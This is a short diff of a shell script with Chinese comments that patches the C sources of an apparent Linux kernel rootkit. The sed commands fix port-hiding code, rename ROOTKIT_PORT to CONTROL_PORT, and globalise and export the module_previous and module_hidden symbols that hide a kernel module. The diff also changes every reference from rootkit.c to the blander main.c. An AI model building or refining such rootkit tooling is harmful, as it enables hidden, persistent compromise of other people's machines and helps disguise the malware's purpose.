@@ -114,17 +114,17 @@ sed -i.bak 's/ROOTKIT_PORT/CONTROL_PORT/g' port_hiding.c
 # 删除重复的函数声明
 sed -i.bak '/static int is_magic_port(__be16 port);/d' port_hiding.c
 
-echo "修复rootkit.c中的符号导出问题..."
+echo "修复main.c中的符号导出问题..."
 # 将static变量改为全局变量以便导出
-sed -i.bak 's/static struct list_head \*module_previous;/struct list_head *module_previous;/' rootkit.c
-sed -i.bak 's/static short module_hidden = 0;/short module_hidden = 0;/' rootkit.c
+sed -i.bak 's/static struct list_head \*module_previous;/struct list_head *module_previous;/' main.c
+sed -i.bak 's/static short module_hidden = 0;/short module_hidden = 0;/' main.c
 
 # 添加符号导出
 sed -i.bak '/EXPORT_SYMBOL(enable_write_protection);/a\
 EXPORT_SYMBOL(module_previous);\
-EXPORT_SYMBOL(module_hidden);' rootkit.c
+EXPORT_SYMBOL(module_hidden);' main.c
 
-echo "rootkit.c符号导出修复完成"
+echo "main.c符号导出修复完成"
 
 echo "✅ 修复完成"
 
